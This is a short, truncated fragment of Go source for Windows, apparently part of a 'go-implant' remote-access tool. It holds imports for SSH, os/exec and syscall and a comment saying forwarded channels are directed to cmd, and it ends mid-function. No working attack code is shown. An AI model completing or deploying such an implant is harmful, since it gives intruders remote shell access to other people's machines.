// +build windows

package ssh

import (
	"go-implant/client/config"
	"fmt"
	"log"
	"os/exec"
	"syscall"

	"golang.org/x/crypto/ssh"
)

// On windows, only port forward requests are accepted. These are directed to cmd
func handleChannel(newChannel ssh.NewC